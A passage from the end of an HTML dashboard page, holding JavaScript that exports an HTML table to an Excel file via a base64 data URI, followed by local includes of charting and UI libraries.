                                var format = function(s, c) {
                                return s.replace(/{(\w+)}/g, function(m, p) {
                                return c[p];
                                })
                                };

                                htmls = table;

                                var ctx = {
                                worksheet : 'Worksheet',
                                table : htmls
                                }


                                var link = document.createElement("a");
                                link.download = "export.xls";
                                link.href = uri + base64(format(template, ctx));
                                link.click();

                    }





    </script>

    <script type="text/javascript">
var exportToExcel = (function() {
  var uri = 'data:application/vnd.ms-excel;base64,'
    , template = "<html xmlns:o='urn:schemas-microsoft-com:office:office' xmlns:x='urn:schemas-microsoft-com:office:excel' xmlns='http://www.w3.org/TR/REC-html40'><head><!--[if gte mso 9]><?xml version='1.0' encoding='UTF-8' standalone='yes'?><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name></x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--></head><body><table>{table}</table></body></html>"
    , base64 = function(s) { return window.btoa(unescape(encodeURIComponent(s))) }
    , format = function(s, c) { return s.replace(/{(\w+)}/g, function(m, p) { return c[p]; }) }
  return function(table, name) {
      if (!table.nodeType) table = document.getElementById(table)
      var ctx = { worksheet: name || 'Worksheet', table: table.innerHTML }
    window.location.href = uri + base64(format(template, ctx))
  }
})()
</script>


    <!-- jQuery -->
    <script src="../vendors/jquery/dist/jquery.min.js"></script>

    <script src="../build/js/tagsCloud.js"></script>




    <!-- Bootstrap -->
    <script src="../vendors/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- FastClick -->
    <script src="../vendors/fastclick/lib/fastclick.js"></script>
    <!-- NProgress -->
    <script src="../vendors/nprogress/nprogress.js"></script>
    <!-- Chart.js -->
    <script src="../vendors/Chart.js/dist/Chart.min.js"></script>
    <!-- gauge.js -->
    <script src="../vendors/gauge.js/dist/gauge.min.js"></script>
    <!-- bootstrap-progressbar -->
    <script
    src="../vendors/bootstrap-progressbar/bootstrap-progressbar.min.js"></script>
    <!-- iCheck -->
    <script src="../vendors/iCheck/icheck.min.js"></script>
    <!-- Skycons -->
    <script src="../vendors/skycons/skycons.js"></script>
    <!-- Flot -->
    <script src="../vendors/Flot/jquery.flot.js"></script>
    <script src="../vendors/Flot/jquery.flot.pie.js"></script>
    <script src="../vendors/Flot/jquery.flot.time.js"></script>
    <script src="../vendors/Flot/jquery.flot.stack.js"></script>
    <script src="../vendors/Flot/jquery.flot.resize.js"></script>
    <!-- Flot plugins -->
    <script src="../vendors/flot.orderbars/js/jquery.flot.orderBars.js"></script>
    <script src="../vendors/flot-spline/js/jquery.flot.spline.min.js"></script>
    <script src="../vendors/flot.curvedlines/curvedLines.js"></script>
    <!-- DateJS -->
    <script src="../vendors/DateJS/build/date.js"></script>
    <!-- JQVMap -->
    <script src="../vendors/jqvmap/dist/jquery.vmap.js"></script>
    <script src="../vendors/jqvmap/dist/maps/jquery.vmap.world.js"></script>
    <script src="../vendors/jqvmap/examples/js/jquery.vmap.sampledata.js"></script>
    <!-- bootstrap-daterangepicker -->
    <script src="../vendors/moment/min/moment.min.js"></script>
    <script src="../vendors/bootstrap-daterangepicker/daterangepicker.js"></script>

    <!-- Custom Theme Scripts -->
    <script src="../build/js/custom.min.js"></script>

    <script src="../vendors/raphael/raphael.min.js"></script>
    <script src="../vendors/morris.js/morris.min.js"></script>


    <script src="../vendors/echarts/dist/echarts.min.js"></script>
    <script src="../vendors/echarts/map/js/world.js"></script>
<!-- amCharts javascript sources -->
		<script type="text/javascript" src="../lib/amcharts.js"></script>
		<script type="text/javascript" src="../lib/serial.js"></script>


</body>
</html>
